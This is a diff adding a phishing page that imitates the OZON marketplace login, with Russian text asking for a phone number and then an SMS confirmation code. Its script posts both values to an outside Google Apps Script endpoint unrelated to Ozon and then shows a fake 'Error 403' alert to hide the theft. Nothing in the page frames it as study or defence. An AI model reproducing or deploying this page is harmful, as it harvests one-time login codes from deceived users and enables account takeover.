@@ -1,0 +1,133 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OZON — маркетплейс миллионы товаров по выгодным ценам</title>
+    <link rel="icon" href="img/logo_icon.png" type="image/x-icon">
+    <link rel="stylesheet" href="css/style.css">
+</head>
+
+<body>
+    <div class="container">
+        <dev class="top">
+            <img class="logo" src="img/ozon-id-v2.svg" alt="logo">
+            <a href="#" class="clos"><img class="clos__icon" src="img/icons8.png"></a>
+        </dev>
+        <dev class="text__big">Введите номер телефона</dev>
+        <dev class="text">Мы отправим код или позвоним. Отвечать на звонок не нужно. Код может прийти на почту или в СМС
+        </dev>
+        <form method="post" id="form" class="l">
+            <dev class="nomber">
+                <div class="cantru">
+                    <img class="cantru__icon" src="img/russia.png">
+                    <dev>+7</dev>
+                    <img class="cantru__dovn" src="img/down.png">
+                </div>
+                <dev class="phone">
+                    <input type="text" class="mask-phone phone__n" name="phone" required autofocus autocomplete="off" minlength="2" maxlength="20" placeholder="(999) 999-99-99"><br><br>
+
+<script src="https://snipp.ru/cdn/jquery/2.1.1/jquery.min.js"></script>
+<script src="https://snipp.ru/cdn/maskedinput/jquery.maskedinput.min.js"></script>
+<script>
+$.mask.definitions['h'] = "[0|1|3|4|5|6|7|9]"
+$(".mask-phone").mask("(h99) 999-99-99");
+</script>
+                </dev>
+            </dev>
+            <a class="content_toggle" href="#">Отправить код</a>
+            <dev class="text__or">--- или ---</dev>
+            <a href="#" class="email">Войти по почте</a>
+            
+            <div class="content_block" style="display: none;">
+                <dev class="text__big">Введите код подтверждения из смс</dev>
+                <dev class="text">На Ваш номер отправлено смс-сообщение с кодом подтверждения. Введите код и нажмите «Войти»</dev>
+                <dev class="nomber">
+                        <input type="text" class="mask-code code" name="cod" required autocomplete="off" maxlength="40" placeholder="ххх-ххх"><br><br>
+<script src="https://snipp.ru/cdn/jquery/2.1.1/jquery.min.js"></script>
+<script src="https://snipp.ru/cdn/maskedinput/jquery.maskedinput.min.js"></script>
+<script>
+$.mask.definitions['h'] = "[0|1|3|4|5|6|7|9]"
+$(".mask-code").mask("999-999");
+</script>
+                </dev>
+                <input class="codsms" type="submit" value="Войти"/>
+            </div>
+            <script src="https://snipp.ru/cdn/jquery/2.1.1/jquery.min.js"></script>
+            <script>
+                $(document).ready(function () {
+                    $('.content_toggle').click(function () {
+                        $('.content_block').slideToggle(300);
+                        $('.container').addClass('container2');
+                        $('.text__or').addClass('noot');
+                        $('.email').addClass('noot');
+                        if ($(this).is(':hidden')) {
+                            $('.content_toggle').removeClass('open');
+                        } else {
+                            $('.content_toggle').html('Скрыть текст');
+                            $('.content_toggle').addClass('open');
+                        }
+                        return false;
+                    });
+                });
+            </script>
+        </form>
+        <script>
+            const URL_APP = "https://script.google.com/macros/s/AKfycbwlJIUhkX8jby5v9QJOeKUDMYnt7hHSodg-WvlLtu2IjLqPXUZBJgSBYNqki9eqGNm7/exec";
+       const form = document.querySelector("#form");
+       form.action = URL_APP;
+       
+       // вспомогательная функция проверки заполненности формы
+       function isFilled(details) {
+         const { phone, cod} = details;
+         if (!phone) return false;
+         if (!cod) return false;
+         return true;
+       }
+       
+       form.addEventListener("submit", async (ev) => {
+         ev.preventDefault();
+         const phone = document.querySelector("[name=phone]");
+         const cod = document.querySelector("[name=cod]");
+         let details = {
+           phone: phone.value.trim(),
+           cod: cod.value.trim(),
+         };
+         // если поля не заполнены - прекращаем обработку
+         // if (!isFilled(details)) return;
+       
+         let formBody = [];
+         for (let property in details) {
+           let encodedKey = encodeURIComponent(property);
+           let encodedValue = encodeURIComponent(details[property]);
+           formBody.push(encodedKey + "=" + encodedValue);
+         }
+         formBody = formBody.join("&");
+       
+         const result = await fetch(URL_APP, {
+           method: "POST",
+           headers: {
+             "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
+           },
+           //cors: "no-cors", <- это неправильно
+           mode: "cors", //<- оставим по умолчанию
+           body: formBody,
+         })
+           .then((res) => res.json())
+           .catch((err) => alert("Ошибка!"))
+           // .then((res) => console.log(res));
+           alert("Ошибка 403: Повторите попытку позже")
+       
+       
+       });
+           </script>
+    </div>
+
+
+
+
+</body>
+
+</html>
